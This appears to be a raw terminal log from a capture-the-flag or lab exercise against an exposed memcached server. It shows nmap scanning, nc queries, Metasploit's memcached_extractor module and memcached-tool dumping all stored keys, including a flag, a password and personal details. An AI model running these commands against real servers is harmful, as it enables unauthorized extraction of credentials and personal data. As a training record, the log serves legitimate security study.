@@ -1,0 +1,244 @@
+root@attackdefense:~# ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+4754: eth0@if4755: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:0a:01:01:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.1.1.5/24 brd 10.1.1.255 scope global eth0
+       valid_lft forever preferred_lft forever
+4757: eth1@if4758: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:c0:82:6d:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 192.130.109.2/24 brd 192.130.109.255 scope global eth1
+       valid_lft forever preferred_lft forever
+root@attackdefense:~# ping http://192.130.109.3
+^C
+root@attackdefense:~# ping 192.130.109.3
+PING 192.130.109.3 (192.130.109.3) 56(84) bytes of data.
+64 bytes from 192.130.109.3: icmp_seq=1 ttl=64 time=0.120 ms
+64 bytes from 192.130.109.3: icmp_seq=2 ttl=64 time=0.088 ms
+64 bytes from 192.130.109.3: icmp_seq=3 ttl=64 time=0.088 ms
+64 bytes from 192.130.109.3: icmp_seq=4 ttl=64 time=0.091 ms
+64 bytes from 192.130.109.3: icmp_seq=5 ttl=64 time=0.084 ms
+^C
+--- 192.130.109.3 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 82ms
+rtt min/avg/max/mdev = 0.084/0.094/0.120/0.014 ms
+root@attackdefense:~# nmap -sV -p- 192.130.109.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 12:15 UTC
+Nmap scan report for qwo1k14a7qbmlwbgooz1tk0wy.temp-network_a-130-109 (192.130.109.3)
+Host is up (0.000014s latency).
+Not shown: 65534 closed ports
+PORT      STATE SERVICE   VERSION
+11211/tcp open  memcached Memcached 1.5.12 (uptime 101 seconds)
+MAC Address: 02:42:C0:82:6D:03 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.87 seconds
+root@attackdefense:~# nc 192.130.109.3 11211
+
+ERROR
+version
+VERSION 1.5.12
+^Z
+[1]+  Stopped                 nc 192.130.109.3 11211
+root@attackdefense:~# nmap -p 11211 --script memcached-info
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 12:18 UTC
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.25 seconds
+root@attackdefense:~# nmap -p 11211 --script memcached-info 192.130.109.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 12:18 UTC
+Nmap scan report for qwo1k14a7qbmlwbgooz1tk0wy.temp-network_a-130-109 (192.130.109.3)
+Host is up (0.000062s latency).
+
+PORT      STATE SERVICE
+11211/tcp open  memcache
+| memcached-info:
+|   Process ID: 7
+|   Uptime: 286 seconds
+|   Server time: 2019-02-22T12:18:33
+|   Architecture: 64 bit
+|   Used CPU (user): 0.027871
+|   Used CPU (system): 0.024387
+|   Current connections: 3
+|   Total connections: 6
+|   Maximum connections: 2147
+|   TCP Port: 11211
+|   UDP Port: 0
+|_  Authentication: no
+MAC Address: 02:42:C0:82:6D:03 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
+root@attackdefense:~# nc 192.130.109.3 11211
+stats items
+STAT items:1:number 10
+STAT items:1:number_hot 0
+STAT items:1:number_warm 0
+STAT items:1:number_cold 10
+STAT items:1:age_hot 0
+STAT items:1:age_warm 0
+STAT items:1:age 381
+STAT items:1:evicted 0
+STAT items:1:evicted_nonzero 0
+STAT items:1:evicted_time 0
+STAT items:1:outofmemory 0
+STAT items:1:tailrepairs 0
+STAT items:1:reclaimed 0
+STAT items:1:expired_unfetched 0
+STAT items:1:evicted_unfetched 0
+STAT items:1:evicted_active 0
+STAT items:1:crawler_reclaimed 0
+STAT items:1:crawler_items_checked 30
+STAT items:1:lrutail_reflocked 0
+STAT items:1:moves_to_cold 10
+STAT items:1:moves_to_warm 0
+STAT items:1:moves_within_lru 0
+STAT items:1:direct_reclaims 0
+STAT items:1:hits_to_hot 0
+STAT items:1:hits_to_warm 0
+STAT items:1:hits_to_cold 0
+STAT items:1:hits_to_temp 0
+END
+^Z
+[2]+  Stopped                 nc 192.130.109.3 11211
+root@attackdefense:~# msfdb init
+Using /usr/local/rvm/gems/ruby-2.5.3
+[ ok ] Starting PostgreSQL 11 database server: main.
+A database appears to be already configured, skipping initialization
+root@attackdefense:~# service postgresql start
+[ ok ] Starting PostgreSQL 11 database server: main.
+root@attackdefense:~# msfconsole
+
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
+
+
+       =[ metasploit v5.0.0-dev-64c629e75a                ]
++ -- --=[ 1836 exploits - 1038 auxiliary - 319 post       ]
++ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
++ -- --=[ ** This is Metasploit 5 development branch **   ]
+
+msf5 > use auxiliary/gather/memcached_extractor
+msf5 auxiliary(gather/memcached_extractor) >
+msf5 auxiliary(gather/memcached_extractor) > show options
+
+Module options (auxiliary/gather/memcached_extractor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    11211            yes       The target port (TCP)
+   THREADS  1                yes       The number of concurrent threads
+
+msf5 auxiliary(gather/memcached_extractor) > set RHOSTS 192.130.109.3
+RHOSTS => 192.130.109.3
+msf5 auxiliary(gather/memcached_extractor) > set T
+set TCP::MAX_SEND_SIZE  set TCP::SEND_DELAY     set THREADS             set TIMESTAMPOUTPUT
+msf5 auxiliary(gather/memcached_extractor) > set THREADS 10
+THREADS => 10
+msf5 auxiliary(gather/memcached_extractor) > run
+
+[+] 192.130.109.3:11211   - Found 10 keys
+
+Keys/Values Found for 192.130.109.3:11211
+=========================================
+
+ Key         Value
+ ---         -----
+ address     "VALUE address 0 14\r\n8188 Yukon St.\r\nEND\r\n"
+ city        "VALUE city 0 10\r\nMount Airy\r\nEND\r\n"
+ country     "VALUE country 0 13\r\nUnited States\r\nEND\r\n"
+ first_name  "VALUE first_name 0 5\r\nJimmy\r\nEND\r\n"
+ flag        "VALUE flag 0 32\r\n25c8dc1c75c9965dff9afd3c8ced2775\r\nEND\r\n"
+ last_name   "VALUE last_name 0 5\r\nFrank\r\nEND\r\n"
+ nick_name   "VALUE nick_name 0 3\r\nJim\r\nEND\r\n"
+ password    "VALUE password 0 7\r\npass123\r\nEND\r\n"
+ state       "VALUE state 0 8\r\nMaryland\r\nEND\r\n"
+ zip         "VALUE zip 0 5\r\n21771\r\nEND\r\n"
+
+[+] 192.130.109.3:11211   - memcached loot stored at /root/.msf4/loot/20190222122236_default_192.130.109.3_memcached.dump_913243.txt
+[*] 192.130.109.3:11211   - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(gather/memcached_extractor) > exit
+root@attackdefense:~# memcdump
+^C
+root@attackdefense:~# memcdump --help
+memdump v1.0
+
+        Dump all values from one or many servers.
+
+Current options. A '=' means the option takes a value.
+
+         --version
+                Display the version of the application and then exit.
+         --help
+                Display this message and then exit.
+         --quiet
+                stderr and stdin will be closed at application startup.
+         --verbose
+                Give more details on the progression of the application.
+         --debug
+                Provide output only useful for debugging.
+         --servers=
+                List which servers you wish to connect to.
+         --hash=
+                Select hash type.
+         --binary
+                Switch to binary protocol.
+         --username=
+                Username to use for SASL authentication
+         --password=
+                Password to use for SASL authentication
+
+root@attackdefense:~# memcdump --servers= 192.130.109.3
+Invalid server list provided:
+root@attackdefense:~# memcdump --servers=192.130.109.3
+flag
+password
+country
+zip
+state
+city
+address
+nick_name
+last_name
+first_name
+root@attackdefense:~# nano memdumptool.pl
+root@attackdefense:~# perl memdumptool.pl
+Usage: memcached-tool <host[:port] | /path/to/socket> [mode]
+
+       memcached-tool 10.0.0.5:11211 display    # shows slabs
+       memcached-tool 10.0.0.5:11211            # same.  (default is display)
+       memcached-tool 10.0.0.5:11211 stats      # shows general stats
+       memcached-tool 10.0.0.5:11211 dump       # dumps keys and values
+root@attackdefense:~# perl memdumptool.pl 192.130.109.3:11211 dump
+Dumping memcache contents
+  Number of buckets: 1
+  Number of items  : 10
+Dumping bucket 1 - 10 total items
+add flag 0 0 32
+25c8dc1c75c9965dff9afd3c8ced2775
+add state 0 0 8
+Maryland
+add first_name 0 0 5
+Jimmy
+add nick_name 0 0 3
+Jim
+add city 0 0 10
+Mount Airy
+add address 0 0 14
+8188 Yukon St.
+add password 0 0 7
+pass123
+add zip 0 0 5
+21771
+add country 0 0 13
+United States
+add last_name 0 0 5
+Frank
+root@attackdefense:~#
